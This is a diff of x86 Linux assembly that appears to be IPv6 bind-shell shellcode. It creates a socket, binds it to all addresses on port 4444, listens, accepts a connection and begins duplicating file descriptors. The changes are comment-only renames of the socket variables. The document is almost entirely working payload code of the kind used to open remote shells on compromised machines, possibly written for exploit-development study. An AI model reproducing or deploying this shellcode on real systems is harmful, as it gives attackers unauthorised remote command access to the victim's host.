@@ -22,11 +22,11 @@ push  0xa       ; AF_INET6
 inc ebx         ; Define SYS_socket = 1
 mov ecx,esp     ; save pointer (ESP) to socket() args (ECX)
 int 0x80
-xchg esi,eax    ; socfd stored in esi
+xchg esi,eax    ; host_sockfd stored in esi
 xor eax,eax     
  
 ;int socketcall(int call, unsigned long *args);
-;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+;bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr)); 
 push DWORD eax   ;x4 dword ipv6 loopback | EAX contains 0
 push DWORD eax
 push DWORD eax
@@ -35,9 +35,9 @@ push eax         ;sin6_addr = in6addr_any | in6addr_any=::0
 push WORD 0x5c11 ;sin6_port=4444 | 0x5c11 | Configurable |
 push WORD 0x0a   ;AF_INET6
 mov ecx,esp		 ;ECX holds pointer to struct sockaddr
-push byte 0x1c 	 ;sizeof(sockaddr)
-push ecx		 ;pointer to sockfd
-push esi		 ;sockfd
+push byte 0x1c 	 ;sizeof(sockaddr_in6) | sockaddr_in6 = 28
+push ecx		 ;pointer to host_sockfd
+push esi		 ;host_sockfd
 mov ecx,esp		 ;ECX points to args
 inc ebx			 ;EBX = 0x2 | #define SYS_BIND 2
 push byte 0x66	 ;socketcall() 
@@ -46,9 +46,9 @@ int 80h
  
 ;Listen
 ;int socketcall(int call, unsigned long *args);
-;int listen(int sockfd, int backlog);
+;int listen(int host_sockfd, int backlog);
 push ebx 		 ;EBX=2 | backlog=2
-push esi		 ;poiter to sockfd
+push esi		 ;poiter to host_sockfd
 mov ecx,esp		 ;ECX points to args 
 inc ebx
 inc ebx			 ;EBX=0x4 | #define SYS_LISTEN 4 
@@ -62,14 +62,14 @@ int 80h
 cdq				 ;EDX = 0x0 | Saves a byte
 push edx		 ;Push NULL 
 push edx		 ;Push NULL
-push esi		 ;Push sockfd
+push esi		 ;Push host_sockfd
 mov ecx,esp		 ;ECX points to args
 inc ebx			 ;EBX = 0x5 | #define SYS_ACCEPT 5
 push byte 0x66	 ;socketcall()
 pop eax
 int 80h
 
-xchg ebx,eax 	 ;save clientfd
+xchg ebx,eax 	 ;save client_sockfd
 
 push byte 0x2	 ;push 0x2 on stack
 pop ecx			 ;ECX = 2
